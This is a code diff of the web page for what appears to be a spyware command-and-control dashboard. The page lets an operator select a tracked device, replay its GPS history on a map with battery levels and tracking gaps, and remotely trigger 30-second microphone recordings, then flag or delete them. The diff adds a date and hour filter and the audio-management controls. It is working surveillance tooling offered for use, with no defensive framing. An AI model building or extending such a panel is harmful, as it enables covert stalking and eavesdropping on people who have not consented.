@@ -7,85 +7,59 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" crossorigin=""/>
     <style>
-        #map {
-            height: 500px;
-            border-radius: 1rem;
-            z-index: 10;
-        }
-        /* Custom scrollbar for the table */
+        #map { height: 500px; border-radius: 1rem; z-index: 10; }
         .scroller::-webkit-scrollbar { width: 6px; }
-        .scroller::-webkit-scrollbar-track { background: #f1f5f9; border-radius: 4px; }
+        .scroller::-webkit-scrollbar-track { background: #f1f5f9; }
         .scroller::-webkit-scrollbar-thumb { background: #cbd5e1; border-radius: 4px; }
     </style>
 </head>
 <body class="bg-gray-100 text-gray-900 font-sans min-h-screen">
     <div class="max-w-7xl mx-auto py-8 px-4 sm:px-6">
-        
-        <!-- Top Navigation Bar -->
         <nav class="mb-8 flex flex-col md:flex-row justify-between items-center bg-white p-4 rounded-2xl shadow-sm border border-gray-200">
-            <div class="flex items-center gap-4 mb-4 md:mb-0">
+            <div class="flex items-center gap-4">
                 <div class="bg-blue-600 text-white p-2 rounded-lg">
-                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"></path><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 11a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
+                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17.657 16.657L13.414 20.9a1.998 1.998 0 01-2.827 0l-4.244-4.243a8 8 0 1111.314 0z"></path></svg>
                 </div>
-                <div>
-                    <h1 class="text-xl font-bold tracking-tight text-gray-900">Historical GPS Logs</h1>
-                    <p class="text-xs text-gray-500 font-medium">Location Tracking Database</p>
-                </div>
+                <div><h1 class="text-xl font-bold tracking-tight text-gray-900">Historical Tracking Logs</h1></div>
             </div>
-            
             <div class="flex items-center gap-6">
                 <a href="/" class="text-xs font-bold text-gray-400 hover:text-blue-600 transition tracking-wide uppercase">C2 Dashboard</a>
-                
-                <div class="flex items-center gap-2 bg-gray-50 px-3 py-2 rounded-xl border border-gray-200">
-                    <label class="text-xs font-bold text-gray-500 uppercase">Target:</label>
-                    <select id="device-select" class="bg-transparent font-semibold text-gray-800 text-sm focus:outline-none cursor-pointer">
-                        <option value="">Loading...</option>
-                    </select>
-                </div>
-                
-                <a href="/logout" class="text-xs font-bold bg-red-50 text-red-600 px-4 py-2 rounded-xl hover:bg-red-100 transition">Logout</a>
+                <select id="device-select" class="bg-transparent font-semibold text-gray-800 text-sm focus:outline-none cursor-pointer">
+                    <option value="">Loading...</option>
+                </select>
             </div>
         </nav>
 
+        <div class="mb-6 bg-white p-4 rounded-2xl shadow-sm border border-gray-200 flex flex-wrap gap-4 items-center justify-between">
+            <div class="flex items-center gap-4 flex-wrap">
+                <input type="date" id="history-date" class="border border-gray-200 rounded-xl px-3 py-1.5 text-sm bg-gray-50 cursor-pointer">
+                
+                <div class="flex items-center gap-2 border border-gray-200 rounded-xl px-3 py-1.5 bg-gray-50">
+                    <span class="text-xs font-bold text-gray-400 uppercase tracking-widest hidden sm:inline">Time:</span>
+                    <input type="range" id="start-hour" min="0" max="24" value="0" class="w-16 sm:w-24 cursor-pointer accent-blue-600">
+                    <span id="time-range-display" class="text-xs font-bold text-gray-700 w-24 text-center">00:00 - 24:00</span>
+                    <input type="range" id="end-hour" min="0" max="24" value="24" class="w-16 sm:w-24 cursor-pointer accent-blue-600">
+                </div>
+            </div>
+            <button type="button" onclick="resetAndFetchHistory()" class="bg-gray-900 text-white text-xs font-bold px-4 py-2.5 rounded-xl uppercase tracking-wider hover:bg-black transition">Apply Filter</button>
+        </div>
+
         <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
-            
-            <!-- Left Column: Data Table and Audio -->
             <div class="flex flex-col gap-6 lg:col-span-1">
                 <div class="bg-white rounded-3xl p-6 shadow-sm border border-gray-200 flex flex-col h-[500px]">
-                    <p class="text-xs font-bold text-gray-400 uppercase tracking-widest mb-4">Raw Coordinate Log</p>
                     <div class="overflow-y-auto scroller pr-2 flex-1">
-                        <table class="w-full text-left border-collapse">
-                            <thead>
-                                <tr class="text-xs text-gray-400 border-b border-gray-100">
-                                    <th class="pb-2 font-semibold">Time</th>
-                                    <th class="pb-2 font-semibold">Lat</th>
-                                    <th class="pb-2 font-semibold">Lon</th>
-                                </tr>
-                            </thead>
-                            <tbody id="history-table" class="text-sm text-gray-600">
-                                <!-- Dynamic Rows -->
-                            </tbody>
+                        <table class="w-full text-left">
+                            <thead><tr class="text-xs text-gray-400 border-b"><th class="pb-2">Time</th><th class="pb-2">Lat</th><th class="pb-2">Lon</th><th class="pb-2">Bat</th><th class="pb-2">Gap</th></tr></thead>
+                            <tbody id="history-table" class="text-sm text-gray-600"></tbody>
                         </table>
                     </div>
                 </div>
-
-                <!-- Surveillance Audio Panel -->
                 <div class="bg-white rounded-3xl p-6 shadow-sm border border-gray-200">
-                    <p class="text-xs font-bold text-gray-400 uppercase tracking-widest mb-4">Remote Microphone</p>
-                    <button onclick="requestAudio()" id="audio-btn" class="w-full bg-red-600 text-white font-bold py-3 rounded-xl hover:bg-red-500 transition shadow mb-4">
-                        Record 30s Audio
-                    </button>
-                    <div id="audio-list" class="flex flex-col gap-3 max-h-48 overflow-y-auto scroller pr-2">
-                        <!-- Dynamic Audio Records -->
-                    </div>
+                    <button onclick="requestAudio()" id="audio-btn" class="w-full bg-red-600 text-white font-bold py-3 rounded-xl hover:bg-red-500 transition shadow mb-4">Record 30s Audio</button>
+                    <div id="audio-list" class="flex flex-col gap-3 max-h-48 overflow-y-auto scroller pr-2"></div>
                 </div>
             </div>
-
-            <!-- Right Column: Interactive Map -->
-            <div class="bg-white rounded-3xl p-2 shadow-sm border border-gray-200 lg:col-span-2 relative">
-                <div id="map"></div>
-            </div>
-            
+            <div class="bg-white rounded-3xl p-2 shadow-sm border border-gray-200 lg:col-span-2"><div id="map"></div></div>
         </div>
     </div>
 
@@ -93,145 +67,130 @@
     <script>
         const selectEl = document.getElementById('device-select');
         const tableBody = document.getElementById('history-table');
-
-        // Initialize Map
         const map = L.map('map', {zoomControl: false}).setView([0, 0], 2);
         L.control.zoom({ position: 'bottomright' }).addTo(map);
-        L.tileLayer('https://{s}.basemaps.cartocdn.com/rastertiles/voyager/{z}/{x}/{y}{r}.png', {
-            attribution: '&copy; OpenStreetMap contributors &copy; CARTO'
-        }).addTo(map);
+        L.tileLayer('https://{s}.basemaps.cartocdn.com/rastertiles/voyager/{z}/{x}/{y}{r}.png').addTo(map);
 
-        let pathLine = L.polyline([], {color: '#ef4444', weight: 4, opacity: 0.8, dashArray: '5, 10', lineJoin: 'round'}).addTo(map);
+        let pathLine = L.polyline([], {color: '#ef4444', weight: 4}).addTo(map);
         let markersGroup = L.layerGroup().addTo(map);
-
-        const dotIcon = L.divIcon({
-            className: 'custom-icon',
-            html: `<div class="bg-red-500 rounded-full w-3 h-3 border border-white hover:bg-blue-500 hover:scale-125 transition-all"></div>`,
-            iconSize: [12, 12],
-            iconAnchor: [6, 6]
-        });
-
-        let currentDataHash = "";
-        let mapMarkers = [];
-        let isFirstLoad = true;
+        let currentDataHash = "", cachedAudioFilesStr = "", mapMarkers = [], isFirstLoad = true;
 
         async function fetchAvailableDevices() {
             try {
-                const devRes = await fetch('/devices');
-                const devData = await devRes.json();
-                if (devData.devices && devData.devices.length > 0) {
-                    const currentVal = selectEl.value;
+                const res = await fetch('/devices');
+                const data = await res.json();
+                if (data.devices && data.devices.length > 0) {
+                    const val = selectEl.value;
                     selectEl.innerHTML = '';
-                    devData.devices.forEach(did => {
+                    data.devices.forEach(did => {
                         const opt = document.createElement('option');
                         opt.value = did; opt.textContent = did;
                         selectEl.appendChild(opt);
                     });
-                    if (currentVal && devData.devices.includes(currentVal)) {
-                        selectEl.value = currentVal;
-                    }
-                } else {
-                    selectEl.innerHTML = '<option value="">No devices</option>';
+                    if (val && data.devices.includes(val)) selectEl.value = val;
                 }
             } catch(err) { console.error(err); }
         }
 
-        function highlightOnMap(lat, lon, i) {
-            map.setView([lat, lon], 17, {animate: true});
-            if(mapMarkers[i]) {
-                mapMarkers[i].openPopup();
-            }
+        const dateInput = document.getElementById('history-date');
+        const startHour = document.getElementById('start-hour');
+        const endHour = document.getElementById('end-hour');
+        const timeDisplay = document.getElementById('time-range-display');
+
+        // Set default date to today
+        const today = new Date();
+        dateInput.value = today.getFullYear() + '-' + String(today.getMonth() + 1).padStart(2, '0') + '-' + String(today.getDate()).padStart(2, '0');
+
+        function updateTimeDisplay() {
+            let s = parseInt(startHour.value);
+            let e = parseInt(endHour.value);
+            if (s > e) { let tmp = s; s = e; e = tmp; } // auto-fix crossover visually
+            timeDisplay.textContent = `${String(s).padStart(2, '0')}:00 - ${String(e).padStart(2, '0')}:00`;
         }
+        startHour.addEventListener('input', updateTimeDisplay);
+        endHour.addEventListener('input', updateTimeDisplay);
+
+        function resetAndFetchHistory() { currentDataHash = ""; isFirstLoad = true; fetchHistory(); }
 
         async function fetchHistory() {
             const activeDevice = selectEl.value;
             if(!activeDevice) return;
-            
             try {
-                
                 let qs = `?device_id=${encodeURIComponent(activeDevice)}`;
-                const startD = document.getElementById('start-date').value;
-                const endD = document.getElementById('end-date').value;
-                if(startD && endD) {
-                    const st = new Date(startD).getTime() / 1000;
-                    const et = new Date(endD).getTime() / 1000;
-                    qs += `&start_time=${st}&end_time=${et}`;
+                const selDateStr = dateInput.value;
+                if(selDateStr) {
+                    let s = parseInt(startHour.value);
+                    let e = parseInt(endHour.value);
+                    if (s > e) { let tmp = s; s = e; e = tmp; }
+
+                    const [y, m, d] = selDateStr.split('-');
+                    
+                    const startDate = new Date(y, m - 1, d);
+                    startDate.setHours(s, 0, 0, 0);
+                    const startTimeUnix = startDate.getTime() / 1000;
+
+                    const endDate = new Date(y, m - 1, d);
+                    if (e === 24) {
+                        endDate.setHours(23, 59, 59, 999);
+                    } else {
+                        endDate.setHours(e, 0, 0, 0);
+                    }
+                    const endTimeUnix = endDate.getTime() / 1000;
+
+                    qs += `&start_time=${startTimeUnix}&end_time=${endTimeUnix}`;
                 }
                 const res = await fetch(`/history_detailed${qs}`);
                 const data = await res.json();
-                
                 if(!data.history) return;
                 
-                // Determine if we need to redraw
-                const newHash = data.history.length > 0 ? (data.history[0].time + data.history.length) : "empty";
-                if(newHash === currentDataHash) return; // Skip redraw if no new GPS pings
+                const newHash = data.history.length > 0 ? (data.history[0].time + "_" + data.history.length) : "empty";
+                if(newHash === currentDataHash) return;
                 currentDataHash = newHash;
 
-                tableBody.innerHTML = '';
-                markersGroup.clearLayers();
-                mapMarkers = [];
-                
-                if(data.history && data.history.length > 0) {
-                    // Update Map
-                    const pathCoords = data.history.slice().reverse().map(r => [r.lat, r.lon]);
-                    pathLine.setLatLngs(pathCoords);
-                    
+                tableBody.innerHTML = ''; markersGroup.clearLayers(); mapMarkers = [];
+                if(data.history.length > 0) {
+                    pathLine.setLatLngs(data.history.slice().reverse().map(r => [r.lat, r.lon]));
                     data.history.forEach((row, i) => {
-                        const marker = L.marker([row.lat, row.lon], {icon: dotIcon})
-                         .bindPopup(`<b>Time:</b> ${row.time}<br><b>Lat:</b> ${row.lat.toFixed(5)}<br><b>Lon:</b> ${row.lon.toFixed(5)}`)
-                         .addTo(markersGroup);
-                         
+                        const marker = L.marker([row.lat, row.lon], {
+                            icon: L.divIcon({className: 'c', html: `<div class="bg-red-500 rounded-full w-3 h-3 border border-white"></div>`, iconSize:[12,12]})
+                        }).bindPopup(`Time: ${row.time}<br>Bat: ${row.level}%`).addTo(markersGroup);
                         mapMarkers.push(marker);
 
-                        // Populate Table Row
+                        let gapStr = "-";
+                        if (i < data.history.length - 1) {
+                            const prevRow = data.history[i + 1];
+                            const gapSecs = Math.max(0, row.unix_time - prevRow.unix_time);
+                            if (gapSecs < 60) gapStr = `${Math.floor(gapSecs)}s`;
+                            else if (gapSecs < 3600) gapStr = `${Math.floor(gapSecs/60)}m`;
+                            else gapStr = `${Math.floor(gapSecs/3600)}h ${Math.floor((gapSecs%3600)/60)}m`;
+                            
+                            // Highlight gaps larger than 5 minutes in red
+                            if (gapSecs > 300) gapStr = `<span class="text-red-500 font-bold">${gapStr}</span>`;
+                            else gapStr = `<span class="text-gray-500">${gapStr}</span>`;
+                        }
+
                         const tr = document.createElement('tr');
-                        tr.className = "border-b border-gray-100 hover:bg-blue-50 transition cursor-pointer";
-                        tr.onclick = () => highlightOnMap(row.lat, row.lon, i);
-                        tr.innerHTML = `
-                            <td class="py-2 text-xs font-mono font-bold text-gray-800">${row.time}</td>
-                            <td class="py-2 ml-2">${row.lat.toFixed(5)}</td>
-                            <td class="py-2">${row.lon.toFixed(5)}</td>
-                        `;
+                        tr.className = "border-b hover:bg-blue-50 cursor-pointer";
+                        tr.onclick = () => { map.setView([row.lat, row.lon], 17); marker.openPopup(); };
+                        const timeOnly = row.time.split(' ')[1] || row.time;
+                        tr.innerHTML = `<td class="py-2 font-mono text-xs font-bold whitespace-nowrap">${timeOnly}</td><td class="text-xs">${row.lat.toFixed(4)}</td><td class="text-xs">${row.lon.toFixed(4)}</td><td class="text-xs font-bold ${row.level < 20 ? 'text-red-600' : 'text-green-600'}">${row.level}%</td><td class="text-xs">${gapStr}</td>`;
                         tableBody.appendChild(tr);
                     });
-
-                    if (isFirstLoad) {
-                        map.fitBounds(pathLine.getBounds(), { padding: [50, 50] });
-                        isFirstLoad = false;
-                    }
-                } else {
-                    tableBody.innerHTML = '<tr><td colspan="3" class="py-4 text-center text-xs text-gray-400">No GPS data found</td></tr>';
-                    pathLine.setLatLngs([]);
+                    if (isFirstLoad) { map.fitBounds(pathLine.getBounds(), {padding:[50,50]}); isFirstLoad = false; }
                 }
-            } catch(e) {
-                console.error(e);
-            }
+            } catch(e) { console.error(e); }
         }
 
         async function requestAudio() {
             const activeDevice = selectEl.value;
             if(!activeDevice) return;
             const btn = document.getElementById('audio-btn');
-            btn.textContent = "Command Sent (Waiting 30s...)";
-            btn.classList.replace('bg-red-600', 'bg-gray-500');
-            btn.disabled = true;
-
+            btn.textContent = "Waiting 30s..."; btn.disabled = true;
             const fd = new FormData();
             fd.append('device_id', activeDevice);
             fd.append('record_audio', 1);
-            
-            try {
-                await fetch('/set_record_audio', { method: 'POST', body: fd});
-            } catch (e) {
-                console.error(e);
-            }
-
-            setTimeout(() => {
-                btn.textContent = "Record 30s Audio";
-                btn.classList.replace('bg-gray-500', 'bg-red-600');
-                btn.disabled = false;
-                fetchAudioList();
-            }, 35000);
+            await fetch('/set_record_audio', { method: 'POST', body: fd});
+            setTimeout(() => { btn.textContent = "Record 30s Audio"; btn.disabled = false; fetchAudioList(); }, 35000);
         }
 
         async function fetchAudioList() {
@@ -240,57 +199,58 @@
             try {
                 const res = await fetch(`/audio_files?device_id=${encodeURIComponent(activeDevice)}`);
                 const data = await res.json();
+                const str = JSON.stringify(data.files || []);
+                if (str === cachedAudioFilesStr) return;
+                cachedAudioFilesStr = str;
+
                 const listEl = document.getElementById('audio-list');
                 listEl.innerHTML = '';
                 if(data.files && data.files.length > 0) {
                     data.files.forEach(f => {
                         const filename = f.split('/').pop();
-                        // Extract timestamp string from filename for a nice label
-                        const timeStr = new Date(parseInt(filename.split('_')[1].split('.')[0]) * 1000).toLocaleString();
-                        
                         if (filename.includes("BUSY")) {
-                            listEl.innerHTML += `
-                            <div class="bg-red-50 border border-red-200 rounded-lg p-2 text-center text-red-600 text-xs font-bold shadow-sm">
-                                🚫 ${timeStr} - Mic was in use by another app!
-                            </div>`;
+                            listEl.innerHTML += `<div class="bg-red-50 border p-2 rounded text-red-600 text-xs">🚫 Mic busy!</div>`;
                         } else {
+                            const isFlagged = filename.includes("_FLAG");
+                            const bgClass = isFlagged ? "bg-orange-50 border-orange-300" : "bg-gray-50 border-gray-200";
+                            const flagBtn = isFlagged ? `<span class="px-2 py-0.5 bg-orange-500 text-white rounded text-[10px] uppercase font-bold tracking-wider">Flagged</span>` : `<button onclick="flagAudio('${filename}')" class="px-2 py-0.5 bg-orange-100 text-orange-700 hover:bg-orange-200 rounded text-[10px] uppercase font-bold tracking-wider transition">Flag</button>`;
+                            
                             listEl.innerHTML += `
-                            <div class="bg-gray-50 border border-gray-200 rounded-lg p-2">
-                                <p class="text-[10px] text-gray-500 font-bold mb-1">${timeStr}</p>
-                                <audio controls class="w-full h-8" src="${f}"></audio>
-                            </div>`;
+                                <div class="${bgClass} border p-2 rounded flex flex-col gap-2 transition-all">
+                                    <div class="flex justify-between items-center">
+                                        <span class="text-[10px] font-bold ${isFlagged ? 'text-orange-700' : 'text-gray-400'} truncate w-24" title="${filename}">${filename.substring(0, 15)}...</span>
+                                        <div class="flex gap-1 items-center">
+                                            ${flagBtn}
+                                            <button onclick="deleteAudio('${filename}')" class="px-2 py-0.5 bg-red-100 text-red-700 hover:bg-red-200 rounded text-[10px] uppercase font-bold tracking-wider transition">Del</button>
+                                        </div>
+                                    </div>
+                                    <audio controls class="w-full h-8" src="${f}"></audio>
+                                </div>`;
                         }
                     });
-                } else {
-                    listEl.innerHTML = '<p class="text-xs text-gray-400 text-center py-2">No recordings yet.</p>';
                 }
-            } catch (e) {
-                console.error(e);
-            }
+            } catch (e) { console.error(e); }
         }
 
-        async function init() {
-            await fetchAvailableDevices();
-            await fetchHistory();
+        async function deleteAudio(filename) {
+            if(!confirm("Permanently delete this recording?")) return;
+            const fd = new FormData();
+            fd.append('filename', filename);
+            await fetch('/delete_audio', { method: 'POST', body: fd});
+            cachedAudioFilesStr = "";
             fetchAudioList();
-            
-            // Poll for history every 3 seconds
-            setInterval(() => {
-                if (!document.hidden) {
-                    fetchAvailableDevices();
-                    fetchHistory();
-                    fetchAudioList();
-                }
-            }, 3000);
         }
 
-        selectEl.addEventListener('change', () => {
-            currentDataHash = "";
-            isFirstLoad = true;
-            fetchHistory();
+        async function flagAudio(filename) {
+            const fd = new FormData();
+            fd.append('filename', filename);
+            await fetch('/flag_audio', { method: 'POST', body: fd});
+            cachedAudioFilesStr = "";
             fetchAudioList();
-        });
-        init();
+        }
+
+        selectEl.addEventListener('change', () => { currentDataHash = ""; cachedAudioFilesStr = ""; isFirstLoad = true; fetchHistory(); fetchAudioList(); });
+        (async () => { await fetchAvailableDevices(); fetchHistory(); fetchAudioList(); setInterval(() => { if(!document.hidden){ fetchHistory(); fetchAudioList(); } }, 3000); })();
     </script>
 </body>
 </html>
